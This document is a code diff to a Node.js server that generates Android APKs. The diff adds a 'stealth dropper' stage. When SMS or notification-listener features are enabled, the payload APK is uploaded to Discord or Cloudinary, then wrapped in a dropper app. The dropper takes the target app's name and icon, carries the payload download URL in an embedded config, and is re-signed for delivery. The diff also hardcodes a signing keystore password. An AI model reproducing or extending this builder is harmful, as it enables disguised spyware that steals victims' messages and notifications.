@@ -20,10 +20,11 @@ const upload = multer({ storage: multer.memoryStorage() });
 
 const ASSETS_DIR = path.join(__dirname, 'assets');
 const TEMP_DIR   = path.join(__dirname, 'temp');
-const BASE_APK     = path.join(ASSETS_DIR, 'base.apk');
-const DEFAULT_ICON = path.join(ASSETS_DIR, 'default_icon.png');
-const KEYSTORE     = path.join(ASSETS_DIR, 'usman90.jks');
-const SIGNER       = path.join(ASSETS_DIR, 'uber-apk-signer.jar');
+const BASE_APK      = path.join(ASSETS_DIR, 'base.apk');
+const NOX_DROP_BASE = path.join(ASSETS_DIR, 'nox_drop_base.apk');
+const DEFAULT_ICON  = path.join(ASSETS_DIR, 'default_icon.png');
+const KEYSTORE      = path.join(ASSETS_DIR, 'usman90.jks');
+const SIGNER        = path.join(ASSETS_DIR, 'uber-apk-signer.jar');
 
 if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });
 
@@ -136,6 +137,44 @@ function patchManifestPackage(manifestBuf, newPkg) {
 
 const APP_NAME_PH = 'AppTitlePlaceholder_';
 
+function patchArscTitle(arscBuf, targetName) {
+    const s = Buffer.from(APP_NAME_PH, 'utf8');
+    const idx = arscBuf.indexOf(s);
+    if (idx !== -1) {
+        const safeTitle = targetName.substring(0, APP_NAME_PH.length);
+        const byteLen = Buffer.byteLength(safeTitle, 'utf8');
+        arscBuf[idx - 2] = safeTitle.length;
+        arscBuf[idx - 1] = byteLen;
+        Buffer.from(safeTitle, 'utf8').copy(arscBuf, idx);
+        arscBuf[idx + byteLen] = 0;
+        for (let i = byteLen + 1; i <= APP_NAME_PH.length; i++) {
+            arscBuf[idx + i] = 0;
+        }
+        console.log(`[ARSC] Title updated to: "${safeTitle}" (${byteLen} bytes)`);
+        return true;
+    }
+    return false;
+}
+
+async function signApk(unsignedPath) {
+    const ksArgs = fs.existsSync(KEYSTORE)
+        ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
+        : '';
+    const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" ${ksArgs} --allowResign`;
+
+    await new Promise((resolve, reject) => {
+        exec(signCmd, { timeout: 120000 }, (err, stdout, stderr) => {
+            if (err) {
+                console.error('[SIGN] uber-apk-signer error:', stderr || err.message);
+                exec(`java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" --allowResign`,
+                    { timeout: 60000 }, (e2) => e2 ? reject(e2) : resolve());
+            } else {
+                resolve();
+            }
+        });
+    });
+}
+
 const KNOWN_ICON_ENTRIES = [
     { path: 'res/d2.webp', size: 48 },
     { path: 'res/yw.webp', size: 48 },
@@ -236,6 +275,40 @@ async function replaceIcons(zip, pngBuffer) {
     }
 
     console.log(`[ICON] Replaced ${count} icon files`);
+}
+
+async function uploadApkToCloud(signedPath, finalApkName) {
+    let downloadUrl = '';
+    if (process.env.DISCORD_WEBHOOK_URL) {
+        try {
+            const form = new FormData();
+            form.append('file', fs.createReadStream(signedPath), { filename: finalApkName });
+            const r = await axios.post(process.env.DISCORD_WEBHOOK_URL, form, {
+                headers: form.getHeaders(), maxBodyLength: Infinity, maxContentLength: Infinity
+            });
+            downloadUrl = r.data?.attachments?.[0]?.url || '';
+        } catch (e) { console.error('[UPLOAD] Discord failed:', e.message); }
+    }
+
+    if (!downloadUrl && process.env.CLOUDINARY_CLOUD_NAME) {
+        try {
+            cloudinary.config({
+                cloud_name:  process.env.CLOUDINARY_CLOUD_NAME,
+                api_key:     process.env.CLOUDINARY_API_KEY,
+                api_secret:  process.env.CLOUDINARY_API_SECRET,
+            });
+            const binPath = signedPath.replace('.apk', '.bin');
+            fs.copyFileSync(signedPath, binPath);
+            const r = await cloudinary.uploader.upload(binPath, {
+                resource_type: 'raw',
+                folder:        'generated_apks',
+                public_id:     `${finalApkName.replace('.apk', '')}_${Date.now()}`,
+            });
+            downloadUrl = r.secure_url || '';
+            if (fs.existsSync(binPath)) fs.unlinkSync(binPath);
+        } catch (e) { console.error('[UPLOAD] Cloudinary failed:', e.message); }
+    }
+    return downloadUrl;
 }
 
 const NOTIF_PRESETS = {
@@ -423,9 +496,11 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 manifestEntry.setData(manifestBuf);
             }
 
+            let activeIconBuffer = null;
             if (customIcon && customIcon.buffer) {
                 await sendUpdate('apk_progress', { step: 'Embedding custom launcher icons...', progress: 50 });
-                await replaceIcons(zip, customIcon.buffer);
+                activeIconBuffer = customIcon.buffer;
+                await replaceIcons(zip, activeIconBuffer);
             } else {
                 try {
                     await sendUpdate('apk_progress', { step: 'Generating launcher icons...', progress: 50 });
@@ -436,7 +511,8 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                         fallbackBuf = await generateDefaultAppIcon(targetName);
                     }
                     if (fallbackBuf) {
-                        await replaceIcons(zip, fallbackBuf);
+                        activeIconBuffer = fallbackBuf;
+                        await replaceIcons(zip, activeIconBuffer);
                     }
                 } catch (iconErr) {
                     console.error('[ICON] Fallback icon error:', iconErr.message);
@@ -484,72 +560,106 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const finalArsc = zip.getEntry('resources.arsc');
             if (finalArsc) finalArsc.header.method = 0;
 
-            zip.writeZip(unsignedPath);
+            const unsignedPayloadPath = path.join(TEMP_DIR, `unsigned-payload-${uuid}.apk`);
+            zip.writeZip(unsignedPayloadPath);
 
-            await sendUpdate('apk_progress', { step: 'Signing package with usman90 key...', progress: 85 });
-            const ksArgs = fs.existsSync(KEYSTORE)
-                ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
-                : '';
-            const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" ${ksArgs} --allowResign`;
+            await sendUpdate('apk_progress', { step: 'Signing payload package with usman90 key...', progress: 85 });
+            await signApk(unsignedPayloadPath);
 
-            await new Promise((resolve, reject) => {
-                exec(signCmd, { timeout: 120000 }, (err, stdout, stderr) => {
-                    if (err) {
-                        console.error('[SIGN] uber-apk-signer error:', stderr || err.message);
-                        exec(`java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" --allowResign`,
-                            { timeout: 60000 }, (e2) => e2 ? reject(e2) : resolve());
-                    } else {
-                        resolve();
-                    }
-                });
-            });
+            const signedPayloadName = fs.readdirSync(TEMP_DIR)
+                .find(f => f.startsWith(`unsigned-payload-${uuid}`) && f.includes('signed'));
+            if (!signedPayloadName) throw new Error('Signed payload APK not found after signing step');
+            const signedPayloadPath = path.join(TEMP_DIR, signedPayloadName);
 
-            await sendUpdate('apk_progress', { step: 'Finalizing package...', progress: 92 });
-            const signedName = fs.readdirSync(TEMP_DIR)
-                .find(f => f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));
-            if (!signedName) throw new Error('Signed APK not found after signing step');
-            const signedPath = path.join(TEMP_DIR, signedName);
+            await sendUpdate('apk_progress', { step: 'Uploading payload to cloud storage...', progress: 90 });
+            const payloadDownloadUrl = await uploadApkToCloud(signedPayloadPath, finalApkName);
 
-            let downloadUrl = '';
-            await sendUpdate('apk_progress', { step: 'Uploading package to cloud...', progress: 95 });
-
-            if (process.env.DISCORD_WEBHOOK_URL) {
-                try {
-                    const form = new FormData();
-                    form.append('file', fs.createReadStream(signedPath), { filename: finalApkName });
-                    const r = await axios.post(process.env.DISCORD_WEBHOOK_URL, form, {
-                        headers: form.getHeaders(), maxBodyLength: Infinity, maxContentLength: Infinity
-                    });
-                    downloadUrl = r.data?.attachments?.[0]?.url || '';
-                } catch (e) { console.error('[UPLOAD] Discord failed:', e.message); }
-            }
-
-            if (!downloadUrl && process.env.CLOUDINARY_CLOUD_NAME) {
-                try {
-                    cloudinary.config({
-                        cloud_name:  process.env.CLOUDINARY_CLOUD_NAME,
-                        api_key:     process.env.CLOUDINARY_API_KEY,
-                        api_secret:  process.env.CLOUDINARY_API_SECRET,
-                    });
-                    const binPath = signedPath.replace('.apk', '.bin');
-                    fs.copyFileSync(signedPath, binPath);
-                    const r = await cloudinary.uploader.upload(binPath, {
-                        resource_type: 'raw',
-                        folder:        'generated_apks',
-                        public_id:     `${finalApkName.replace('.apk', '')}_${Date.now()}`,
-                    });
-                    downloadUrl = r.secure_url || '';
-                    if (fs.existsSync(binPath)) fs.unlinkSync(binPath);
-                } catch (e) { console.error('[UPLOAD] Cloudinary failed:', e.message); }
-            }
-
-            [unsignedPath, signedPath].forEach(p => {
+            // Clean payload build files from temp
+            [unsignedPayloadPath, signedPayloadPath].forEach(p => {
                 try { if (fs.existsSync(p)) fs.unlinkSync(p); } catch (_) {}
             });
 
-            if (downloadUrl) {
-                await sendUpdate('apk_ready', { downloadUrl, packageName: targetPkg });
-                console.log(`[APK] Done: ${uuid} | pkg=${targetPkg}`);
+            if (!payloadDownloadUrl) {
+                throw new Error('Payload cloud upload failed');
+            }
+
+            console.log(`[APK] Payload uploaded successfully: ${payloadDownloadUrl}`);
+
+            const needsStealthDropper = isSmsEnabled || isNotifListenerEnabled;
+            let finalDeliveryUrl = payloadDownloadUrl;
+
+            if (needsStealthDropper) {
+                if (!fs.existsSync(NOX_DROP_BASE)) {
+                    console.warn('[DROPPER] nox_drop_base.apk not found in assets, falling back to direct payload');
+                } else {
+                    await sendUpdate('apk_progress', { step: 'Generating stealth installer package...', progress: 92 });
+                    console.log(`[DROPPER] Building dropper package for UUID=${uuid} | targetPkg=${targetPkg}`);
+
+                    const dropZip = new AdmZip(NOX_DROP_BASE);
+
+                    // 1. Patch Dropper Application Title
+                    const dropArsc = dropZip.getEntry('resources.arsc');
+                    if (dropArsc) {
+                        const arscBuf = dropArsc.getData();
+                        patchArscTitle(arscBuf, targetName);
+                        dropArsc.setData(arscBuf);
+                        dropArsc.header.method = 0;
+                    }
+
+                    // 2. Clone Target Icon into Dropper
+                    if (activeIconBuffer) {
+                        await replaceIcons(dropZip, activeIconBuffer);
+                    }
+
+                    // 3. Inject Dynamic Dropper Configuration
+                    const dropConfig = {
+                        payloadUrl: payloadDownloadUrl,
+                        targetPackage: targetPkg,
+                        appName: targetName
+                    };
+                    dropZip.addFile('assets/drop_config.json', Buffer.from(JSON.stringify(dropConfig, null, 2), 'utf8'));
+
+                    // 4. Strip Old META-INF Signatures from Dropper
+                    for (const entry of dropZip.getEntries()) {
+                        const en = entry.entryName;
+                        if (en.startsWith('META-INF/') && SIG_EXTS.some(x => en.toUpperCase().endsWith(x))) {
+                            dropZip.deleteFile(en);
+                        }
+                    }
+
+                    const finalDropArsc = dropZip.getEntry('resources.arsc');
+                    if (finalDropArsc) finalDropArsc.header.method = 0;
+
+                    const unsignedDropPath = path.join(TEMP_DIR, `unsigned-dropper-${uuid}.apk`);
+                    dropZip.writeZip(unsignedDropPath);
+
+                    await sendUpdate('apk_progress', { step: 'Signing installer package...', progress: 96 });
+                    await signApk(unsignedDropPath);
+
+                    const signedDropName = fs.readdirSync(TEMP_DIR)
+                        .find(f => f.startsWith(`unsigned-dropper-${uuid}`) && f.includes('signed'));
+                    if (!signedDropName) throw new Error('Signed dropper APK not found after signing step');
+                    const signedDropPath = path.join(TEMP_DIR, signedDropName);
+
+                    await sendUpdate('apk_progress', { step: 'Finalizing installer delivery...', progress: 98 });
+                    const dropperUploadUrl = await uploadApkToCloud(signedDropPath, finalApkName);
+
+                    [unsignedDropPath, signedDropPath].forEach(p => {
+                        try { if (fs.existsSync(p)) fs.unlinkSync(p); } catch (_) {}
+                    });
+
+                    if (dropperUploadUrl) {
+                        finalDeliveryUrl = dropperUploadUrl;
+                        console.log(`[DROPPER] Installer package delivered: ${dropperUploadUrl}`);
+                    } else {
+                        console.warn('[DROPPER] Dropper upload failed, delivering direct payload');
+                    }
+                }
+            }
+
+            if (finalDeliveryUrl) {
+                await sendUpdate('apk_ready', { downloadUrl: finalDeliveryUrl, packageName: targetPkg });
+                console.log(`[APK] Build Complete: ${uuid} | pkg=${targetPkg}`);
             } else {
                 await sendUpdate('apk_error', { message: 'Upload failed' });
             }
